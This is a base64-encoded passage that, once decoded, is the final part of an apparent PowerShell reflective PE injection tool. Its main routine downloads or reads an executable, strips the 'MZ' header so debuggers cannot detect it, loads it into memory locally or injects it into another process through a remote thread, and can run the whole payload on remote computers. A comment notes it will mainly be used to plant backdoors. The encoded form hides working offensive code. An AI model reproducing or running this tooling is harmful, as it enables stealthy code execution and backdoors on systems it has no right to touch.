GlvbiBDb250aW51ZQoJCQkJfQoJCQkJCgkJCQkkSW1wb3J0RGVzY3JpcHRvclB0ciA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICgkSW1wb3J0RGVzY3JpcHRvclB0cikgKFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV0kV2luMzJUeXBlcy5JTUFHRV9JTVBPUlRfREVTQ1JJUFRPUikpCgkJCX0KCQl9CgkJCgkJI0NhbGwgRGxsTWFpbiB3aXRoIHByb2Nlc3MgZGV0YWNoCgkJV3JpdGUtVmVyYm9zZSAiQ2FsbGluZyBkbGxtYWluIHNvIHRoZSBETEwga25vd3MgaXQgaXMgYmVpbmcgdW5sb2FkZWQiCgkJJERsbE1haW5QdHIgPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoJFBFSW5mby5QRUhhbmRsZSkgKCRQRUluZm8uSU1BR0VfTlRfSEVBREVSUy5PcHRpb25hbEhlYWRlci5BZGRyZXNzT2ZFbnRyeVBvaW50KQoJCSREbGxNYWluRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtVSW50MzJdLCBbSW50UHRyXSkgKFtCb29sXSkKCQkkRGxsTWFpbiA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCREbGxNYWluUHRyLCAkRGxsTWFpbkRlbGVnYXRlKQoJCQoJCSREbGxNYWluLkludm9rZSgkUEVJbmZvLlBFSGFuZGxlLCAwLCBbSW50UHRyXTo6WmVybykgfCBPdXQtTnVsbAoJCQoJCQoJCSRTdWNjZXNzID0gJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxGcmVlLkludm9rZSgkUEVIYW5kbGUsIFtVSW50NjRdMCwgJFdpbjMyQ29uc3RhbnRzLk1FTV9SRUxFQVNFKQoJCWlmICgkU3VjY2VzcyAtZXEgJGZhbHNlKQoJCXsKCQkJV3JpdGUtV2FybmluZyAiVW5hYmxlIHRvIGNhbGwgVmlydHVhbEZyZWUgb24gdGhlIFBFJ3MgbWVtb3J5LiBDb250aW51aW5nIGFueXdheXMuIiAtV2FybmluZ0FjdGlvbiBDb250aW51ZQoJCX0KCX0KCgoJRnVuY3Rpb24gTWFpbgoJewoJCSRXaW4zMkZ1bmN0aW9ucyA9IEdldC1XaW4zMkZ1bmN0aW9ucwoJCSRXaW4zMlR5cGVzID0gR2V0LVdpbjMyVHlwZXMKCQkkV2luMzJDb25zdGFudHMgPSAgR2V0LVdpbjMyQ29uc3RhbnRzCgkJCgkJJFJlbW90ZVByb2NIYW5kbGUgPSBbSW50UHRyXTo6WmVybwoJCgkJI0lmIGEgcmVtb3RlIHByb2Nlc3MgdG8gaW5qZWN0IGluIHRvIGlzIHNwZWNpZmllZCwgZ2V0IGEgaGFuZGxlIHRvIGl0CgkJaWYgKCgkUHJvY0lkIC1uZSAkbnVsbCkgLWFuZCAoJFByb2NJZCAtbmUgMCkgLWFuZCAoJFByb2NOYW1lIC1uZSAkbnVsbCkgLWFuZCAoJFByb2NOYW1lIC1uZSAiIikpCgkJewoJCQlUaHJvdyAiQ2FuJ3Qgc3VwcGx5IGEgUHJvY0lkIGFuZCBQcm9jTmFtZSwgY2hvb3NlIG9uZSBvciB0aGUgb3RoZXIiCgkJfQoJCWVsc2VpZiAoJFByb2NOYW1lIC1uZSAkbnVsbCAtYW5kICRQcm9jTmFtZSAtbmUgIiIpCgkJewoJCQkkUHJvY2Vzc2VzID0gQChHZXQtUHJvY2VzcyAtTmFtZSAkUHJvY05hbWUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpCgkJCWlmICgkUHJvY2Vzc2VzLkNvdW50IC1lcSAwKQoJCQl7CgkJCQlUaHJvdyAiQ2FuJ3QgZmluZCBwcm9jZXNzICRQcm9jTmFtZSIKCQkJfQoJCQllbHNlaWYgKCRQcm9jZXNzZXMuQ291bnQgLWd0IDEpCgkJCXsKCQkJCSRQcm9jSW5mbyA9IEdldC1Qcm9jZXNzIHwgd2hlcmUgeyAkXy5OYW1lIC1lcSAkUHJvY05hbWUgfSB8IFNlbGVjdC1PYmplY3QgUHJvY2Vzc05hbWUsIElkLCBTZXNzaW9uSWQKCQkJCVdyaXRlLU91dHB1dCAkUHJvY0luZm8KCQkJCVRocm93ICJNb3JlIHRoYW4gb25lIGluc3RhbmNlIG9mICRQcm9jTmFtZSBmb3VuZCwgcGxlYXNlIHNwZWNpZnkgdGhlIHByb2Nlc3MgSUQgdG8gaW5qZWN0IGluIHRvLiIKCQkJfQoJCQllbHNlCgkJCXsKCQkJCSRQcm9jSWQgPSAkUHJvY2Vzc2VzWzBdLklECgkJCX0KCQl9CgkJCgkJI0p1c3QgcmVhbGl6ZWQgdGhhdCBQb3dlclNoZWxsIGxhdW5jaGVzIHdpdGggU2VEZWJ1Z1ByaXZpbGVnZSBmb3Igc29tZSByZWFzb24uLiBTbyB0aGlzIGlzbid0IG5lZWRlZC4gS2VlcGluZyBpdCBhcm91bmQganVzdCBpbmNhc2UgaXQgaXMgbmVlZGVkIGluIHRoZSBmdXR1cmUuCgkJI0lmIHRoZSBzY3JpcHQgaXNuJ3QgcnVubmluZyBpbiB0aGUgc2FtZSBXaW5kb3dzIGxvZ29uIHNlc3Npb24gYXMgdGhlIHRhcmdldCwgZ2V0IFNlRGVidWdQcml2aWxlZ2UKIwkJaWYgKChHZXQtUHJvY2VzcyAtSWQgJFBJRCkuU2Vzc2lvbklkIC1uZSAoR2V0LVByb2Nlc3MgLUlkICRQcm9jSWQpLlNlc3Npb25JZCkKIwkJewojCQkJV3JpdGUtVmVyYm9zZSAiR2V0dGluZyBTZURlYnVnUHJpdmlsZWdlIgojCQkJRW5hYmxlLVNlRGVidWdQcml2aWxlZ2UgLVdpbjMyRnVuY3Rpb25zICRXaW4zMkZ1bmN0aW9ucyAtV2luMzJUeXBlcyAkV2luMzJUeXBlcyAtV2luMzJDb25zdGFudHMgJFdpbjMyQ29uc3RhbnRzCiMJCX0JCgkJCgkJaWYgKCgkUHJvY0lkIC1uZSAkbnVsbCkgLWFuZCAoJFByb2NJZCAtbmUgMCkpCgkJewoJCQkkUmVtb3RlUHJvY0hhbmRsZSA9ICRXaW4zMkZ1bmN0aW9ucy5PcGVuUHJvY2Vzcy5JbnZva2UoMHgwMDFGMEZGRiwgJGZhbHNlLCAkUHJvY0lkKQoJCQlpZiAoJFJlbW90ZVByb2NIYW5kbGUgLWVxIFtJbnRQdHJdOjpaZXJvKQoJCQl7CgkJCQlUaHJvdyAiQ291bGRuJ3Qgb2J0YWluIHRoZSBoYW5kbGUgZm9yIHByb2Nlc3MgSUQ6ICRQcm9jSWQiCgkJCX0KCQkJCgkJCVdyaXRlLVZlcmJvc2UgIkdvdCB0aGUgaGFuZGxlIGZvciB0aGUgcmVtb3RlIHByb2Nlc3MgdG8gaW5qZWN0IGluIHRvIgoJCX0KCQkKCgkJI0xvYWQgdGhlIFBFIHJlZmxlY3RpdmVseQoJCVdyaXRlLVZlcmJvc2UgIkNhbGxpbmcgSW52b2tlLU1lbW9yeUxvYWRMaWJyYXJ5IgoJCSRQRUhhbmRsZSA9IFtJbnRQdHJdOjpaZXJvCgkJaWYgKCRSZW1vdGVQcm9jSGFuZGxlIC1lcSBbSW50UHRyXTo6WmVybykKCQl7CgkJCSRQRUxvYWRlZEluZm8gPSBJbnZva2UtTWVtb3J5TG9hZExpYnJhcnkgLVBFQnl0ZXMgJFBFQnl0ZXMgLUV4ZUFyZ3MgJEV4ZUFyZ3MgLUZvcmNlQVNMUiAkRm9yY2VBU0xSCgkJfQoJCWVsc2UKCQl7CgkJCSRQRUxvYWRlZEluZm8gPSBJbnZva2UtTWVtb3J5TG9hZExpYnJhcnkgLVBFQnl0ZXMgJFBFQnl0ZXMgLUV4ZUFyZ3MgJEV4ZUFyZ3MgLVJlbW90ZVByb2NIYW5kbGUgJFJlbW90ZVByb2NIYW5kbGUgLUZvcmNlQVNMUiAkRm9yY2VBU0xSCgkJfQoJCWlmICgkUEVMb2FkZWRJbmZvIC1lcSBbSW50UHRyXTo6WmVybykKCQl7CgkJCVRocm93ICJVbmFibGUgdG8gbG9hZCBQRSwgaGFuZGxlIHJldHVybmVkIGlzIE5VTEwiCgkJfQoJCQoJCSRQRUhhbmRsZSA9ICRQRUxvYWRlZEluZm9bMF0KCQkkUmVtb3RlUEVIYW5kbGUgPSAkUEVMb2FkZWRJbmZvWzFdICNvbmx5IG1hdHRlcnMgaWYgeW91IGxvYWRlZCBpbiB0byBhIHJlbW90ZSBwcm9jZXNzCgkJCgkJCgkJI0NoZWNrIGlmIEVYRSBvciBETEwuIElmIEVYRSwgdGhlIGVudHJ5IHBvaW50IHdhcyBhbHJlYWR5IGNhbGxlZCBhbmQgd2UgY2FuIG5vdyByZXR1cm4uIElmIERMTCwgY2FsbCB1c2VyIGZ1bmN0aW9uLgoJCSRQRUluZm8gPSBHZXQtUEVEZXRhaWxlZEluZm8gLVBFSGFuZGxlICRQRUhhbmRsZSAtV2luMzJUeXBlcyAkV2luMzJUeXBlcyAtV2luMzJDb25zdGFudHMgJFdpbjMyQ29uc3RhbnRzCgkJaWYgKCgkUEVJbmZvLkZpbGVUeXBlIC1pZXEgIkRMTCIpIC1hbmQgKCRSZW1vdGVQcm9jSGFuZGxlIC1lcSBbSW50UHRyXTo6WmVybykpCgkJewoJCQkjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwoJCQkjIyMgWU9VUiBDT0RFIEdPRVMgSEVSRQoJCQkjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwoJICAgICAgICBzd2l0Y2ggKCRGdW5jUmV0dXJuVHlwZSkKCSAgICAgICAgewoJICAgICAgICAgICAgJ1dTdHJpbmcnIHsKCSAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJDYWxsaW5nIGZ1bmN0aW9uIHdpdGggV1N0cmluZyByZXR1cm4gdHlwZSIKCQkJCSAgICBbSW50UHRyXSRXU3RyaW5nRnVuY0FkZHIgPSBHZXQtTWVtb3J5UHJvY0FkZHJlc3MgLVBFSGFuZGxlICRQRUhhbmRsZSAtRnVuY3Rpb25OYW1lICJXU3RyaW5nRnVuYyIKCQkJCSAgICBpZiAoJFdTdHJpbmdGdW5jQWRkciAtZXEgW0ludFB0cl06Olplcm8pCgkJCQkgICAgewoJCQkJCSAgICBUaHJvdyAiQ291bGRuJ3QgZmluZCBmdW5jdGlvbiBhZGRyZXNzLiIKCQkJCSAgICB9CgkJCQkgICAgJFdTdHJpbmdGdW5jRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoKSAoW0ludFB0cl0pCgkJCQkgICAgJFdTdHJpbmdGdW5jID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJFdTdHJpbmdGdW5jQWRkciwgJFdTdHJpbmdGdW5jRGVsZWdhdGUpCgkJCQkgICAgW0ludFB0cl0kT3V0cHV0UHRyID0gJFdTdHJpbmdGdW5jLkludm9rZSgpCgkJCQkgICAgJE91dHB1dCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RyaW5nVW5pKCRPdXRwdXRQdHIpCgkJCQkgICAgV3JpdGUtT3V0cHV0ICRPdXRwdXQKCSAgICAgICAgICAgIH0KCgkgICAgICAgICAgICAnU3RyaW5nJyB7CgkgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiQ2FsbGluZyBmdW5jdGlvbiB3aXRoIFN0cmluZyByZXR1cm4gdHlwZSIKCQkJCSAgICBbSW50UHRyXSRTdHJpbmdGdW5jQWRkciA9IEdldC1NZW1vcnlQcm9jQWRkcmVzcyAtUEVIYW5kbGUgJFBFSGFuZGxlIC1GdW5jdGlvbk5hbWUgIlN0cmluZ0Z1bmMiCgkJCQkgICAgaWYgKCRTdHJpbmdGdW5jQWRkciAtZXEgW0ludFB0cl06Olplcm8pCgkJCQkgICAgewoJCQkJCSAgICBUaHJvdyAiQ291bGRuJ3QgZmluZCBmdW5jdGlvbiBhZGRyZXNzLiIKCQkJCSAgICB9CgkJCQkgICAgJFN0cmluZ0Z1bmNEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQCgpIChbSW50UHRyXSkKCQkJCSAgICAkU3RyaW5nRnVuYyA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRTdHJpbmdGdW5jQWRkciwgJFN0cmluZ0Z1bmNEZWxlZ2F0ZSkKCQkJCSAgICBbSW50UHRyXSRPdXRwdXRQdHIgPSAkU3RyaW5nRnVuYy5JbnZva2UoKQoJCQkJICAgICRPdXRwdXQgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cmluZ0Fuc2koJE91dHB1dFB0cikKCQkJCSAgICBXcml0ZS1PdXRwdXQgJE91dHB1dAoJICAgICAgICAgICAgfQoKCSAgICAgICAgICAgICdWb2lkJyB7CgkgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiQ2FsbGluZyBmdW5jdGlvbiB3aXRoIFZvaWQgcmV0dXJuIHR5cGUiCgkJCQkgICAgW0ludFB0cl0kVm9pZEZ1bmNBZGRyID0gR2V0LU1lbW9yeVByb2NBZGRyZXNzIC1QRUhhbmRsZSAkUEVIYW5kbGUgLUZ1bmN0aW9uTmFtZSAiVm9pZEZ1bmMiCgkJCQkgICAgaWYgKCRWb2lkRnVuY0FkZHIgLWVxIFtJbnRQdHJdOjpaZXJvKQoJCQkJICAgIHsKCQkJCQkgICAgVGhyb3cgIkNvdWxkbid0IGZpbmQgZnVuY3Rpb24gYWRkcmVzcy4iCgkJCQkgICAgfQoJCQkJICAgICRWb2lkRnVuY0RlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKCkgKFtWb2lkXSkKCQkJCSAgICAkVm9pZEZ1bmMgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkVm9pZEZ1bmNBZGRyLCAkVm9pZEZ1bmNEZWxlZ2F0ZSkKCQkJCSAgICAkVm9pZEZ1bmMuSW52b2tlKCkgfCBPdXQtTnVsbAoJICAgICAgICAgICAgfQoJICAgICAgICB9CgkJCSMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCgkJCSMjIyBFTkQgT0YgWU9VUiBDT0RFCgkJCSMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCgkJfQoJCSNGb3IgcmVtb3RlIERMTCBpbmplY3Rpb24sIGNhbGwgYSB2b2lkIGZ1bmN0aW9uIHdoaWNoIHRha2VzIG5vIHBhcmFtZXRlcnMKCQllbHNlaWYgKCgkUEVJbmZvLkZpbGVUeXBlIC1pZXEgIkRMTCIpIC1hbmQgKCRSZW1vdGVQcm9jSGFuZGxlIC1uZSBbSW50UHRyXTo6WmVybykpCgkJewoJCQkkVm9pZEZ1bmNBZGRyID0gR2V0LU1lbW9yeVByb2NBZGRyZXNzIC1QRUhhbmRsZSAkUEVIYW5kbGUgLUZ1bmN0aW9uTmFtZSAiVm9pZEZ1bmMiCgkJCWlmICgoJFZvaWRGdW5jQWRkciAtZXEgJG51bGwpIC1vciAoJFZvaWRGdW5jQWRkciAtZXEgW0ludFB0cl06Olplcm8pKQoJCQl7CgkJCQlUaHJvdyAiVm9pZEZ1bmMgY291bGRuJ3QgYmUgZm91bmQgaW4gdGhlIERMTCIKCQkJfQoJCQkKCQkJJFZvaWRGdW5jQWRkciA9IFN1Yi1TaWduZWRJbnRBc1Vuc2lnbmVkICRWb2lkRnVuY0FkZHIgJFBFSGFuZGxlCgkJCSRWb2lkRnVuY0FkZHIgPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkVm9pZEZ1bmNBZGRyICRSZW1vdGVQRUhhbmRsZQoJCQkKCQkJI0NyZWF0ZSB0aGUgcmVtb3RlIHRocmVhZCwgZG9uJ3Qgd2FpdCBmb3IgaXQgdG8gcmV0dXJuLi4gVGhpcyB3aWxsIHByb2JhYmx5IG1haW5seSBiZSB1c2VkIHRvIHBsYW50IGJhY2tkb29ycwoJCQkkUlRocmVhZEhhbmRsZSA9IENyZWF0ZS1SZW1vdGVUaHJlYWQgLVByb2Nlc3NIYW5kbGUgJFJlbW90ZVByb2NIYW5kbGUgLVN0YXJ0QWRkcmVzcyAkVm9pZEZ1bmNBZGRyIC1XaW4zMkZ1bmN0aW9ucyAkV2luMzJGdW5jdGlvbnMKCQl9CgkJCgkJI0Rvbid0IGZyZWUgYSBsaWJyYXJ5IGlmIGl0IGlzIGluamVjdGVkIGluIGEgcmVtb3RlIHByb2Nlc3Mgb3IgaWYgaXQgaXMgYW4gRVhFLgogICAgICAgICNOb3RlIHRoYXQgYWxsIERMTCdzIGxvYWRlZCBieSB0aGUgRVhFIHdpbGwgcmVtYWluIGxvYWRlZCBpbiBtZW1vcnkuCgkJaWYgKCRSZW1vdGVQcm9jSGFuZGxlIC1lcSBbSW50UHRyXTo6WmVybyAtYW5kICRQRUluZm8uRmlsZVR5cGUgLWllcSAiRExMIikKCQl7CgkJCUludm9rZS1NZW1vcnlGcmVlTGlicmFyeSAtUEVIYW5kbGUgJFBFSGFuZGxlCgkJfQoJCWVsc2UKCQl7CgkJCSNEZWxldGUgdGhlIFBFIGZpbGUgZnJvbSBtZW1vcnkuCgkJCSRTdWNjZXNzID0gJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxGcmVlLkludm9rZSgkUEVIYW5kbGUsIFtVSW50NjRdMCwgJFdpbjMyQ29uc3RhbnRzLk1FTV9SRUxFQVNFKQoJCQlpZiAoJFN1Y2Nlc3MgLWVxICRmYWxzZSkKCQkJewoJCQkJV3JpdGUtV2FybmluZyAiVW5hYmxlIHRvIGNhbGwgVmlydHVhbEZyZWUgb24gdGhlIFBFJ3MgbWVtb3J5LiBDb250aW51aW5nIGFueXdheXMuIiAtV2FybmluZ0FjdGlvbiBDb250aW51ZQoJCQl9CgkJfQoJCQoJCVdyaXRlLVZlcmJvc2UgIkRvbmUhIgoJfQoKCU1haW4KfQoKI01haW4gZnVuY3Rpb24gdG8gZWl0aGVyIHJ1biB0aGUgc2NyaXB0IGxvY2FsbHkgb3IgcmVtb3RlbHkKRnVuY3Rpb24gTWFpbgp7CglpZiAoKCRQU0NtZGxldC5NeUludm9jYXRpb24uQm91bmRQYXJhbWV0ZXJzWyJEZWJ1ZyJdIC1uZSAkbnVsbCkgLWFuZCAkUFNDbWRsZXQuTXlJbnZvY2F0aW9uLkJvdW5kUGFyYW1ldGVyc1siRGVidWciXS5Jc1ByZXNlbnQpCgl7CgkJJERlYnVnUHJlZmVyZW5jZSAgPSAiQ29udGludWUiCgl9CgkKCVdyaXRlLVZlcmJvc2UgIlBvd2VyU2hlbGwgUHJvY2Vzc0lEOiAkUElEIgoJCglbQnl0ZVtdXSRQRUJ5dGVzID0gJG51bGwKCQoJaWYgKCRQc0NtZGxldC5QYXJhbWV0ZXJTZXROYW1lIC1pZXEgIkxvY2FsRmlsZSIpCgl7CgkJR2V0LUNoaWxkSXRlbSAkUEVQYXRoIC1FcnJvckFjdGlvbiBTdG9wIHwgT3V0LU51bGwKCQlbQnl0ZVtdXSRQRUJ5dGVzID0gW1N5c3RlbS5JTy5GaWxlXTo6UmVhZEFsbEJ5dGVzKChSZXNvbHZlLVBhdGggJFBFUGF0aCkpCgl9CgllbHNlCgl7CgkJJFdlYkNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQKCQkKCQlbQnl0ZVtdXSRQRUJ5dGVzID0gJFdlYkNsaWVudC5Eb3dubG9hZERhdGEoJFBFVXJsKQoJfQoJCgkjVmVyaWZ5IHRoZSBpbWFnZSBpcyBhIHZhbGlkIFBFIGZpbGUKCSRlX21hZ2ljID0gKCRQRUJ5dGVzWzAuLjFdIHwgJSB7W0NoYXJdICRffSkgLWpvaW4gJycKCiAgICBpZiAoJGVfbWFnaWMgLW5lICdNWicpCiAgICB7CiAgICAgICAgdGhyb3cgJ1BFIGlzIG5vdCBhIHZhbGlkIFBFIGZpbGUuJwogICAgfQoKICAgICMgUmVtb3ZlICdNWicgZnJvbSB0aGUgUEUgZmlsZSBzbyB0aGF0IGl0IGNhbm5vdCBiZSBkZXRlY3RlZCBieSAuaW1nc2NhbiBpbiBXaW5EYmcKCSMgVE9ETzogSW52ZXN0aWdhdGUgaG93IG11Y2ggb2YgdGhlIGhlYWRlciBjYW4gYmUgZGVzdHJveWVkLCBJJ2QgaW1hZ2luZSBtb3N0IG9mIGl0IGNhbiBiZS4KICAgICRQRUJ5dGVzWzBdID0gMAogICAgJFBFQnl0ZXNbMV0gPSAwCgkKCSNBZGQgYSAicHJvZ3JhbSBuYW1lIiB0byBleGVhcmdzLCBqdXN0IHNvIHRoZSBzdHJpbmcgbG9va3MgYXMgbm9ybWFsIGFzIHBvc3NpYmxlIChyZWFsIGFyZ3Mgc3RhcnQgaW5kZXhpbmcgYXQgMSkKCWlmICgkRXhlQXJncyAtbmUgJG51bGwgLWFuZCAkRXhlQXJncyAtbmUgJycpCgl7CgkJJEV4ZUFyZ3MgPSAiUmVmbGVjdGl2ZUV4ZSAkRXhlQXJncyIKCX0KCWVsc2UKCXsKCQkkRXhlQXJncyA9ICJSZWZsZWN0aXZlRXhlIgoJfQoKCWlmICgkQ29tcHV0ZXJOYW1lIC1lcSAkbnVsbCAtb3IgJENvbXB1dGVyTmFtZSAtaW1hdGNoICJeXHMqJCIpCgl7CgkJSW52b2tlLUNvbW1hbmQgLVNjcmlwdEJsb2NrICRSZW1vdGVTY3JpcHRCbG9jayAtQXJndW1lbnRMaXN0IEAoJFBFQnl0ZXMsICRGdW5jUmV0dXJuVHlwZSwgJFByb2NJZCwgJFByb2NOYW1lLCRGb3JjZUFTTFIpCgl9CgllbHNlCgl7CgkJSW52b2tlLUNvbW1hbmQgLVNjcmlwdEJsb2NrICRSZW1vdGVTY3JpcHRCbG9jayAtQXJndW1lbnRMaXN0IEAoJFBFQnl0ZXMsICRGdW5jUmV0dXJuVHlwZSwgJFByb2NJZCwgJFByb2NOYW1lLCRGb3JjZUFTTFIpIC1Db21wdXRlck5hbWUgJENvbXB1dGVyTmFtZQoJfQp9CgpNYWluCn0=
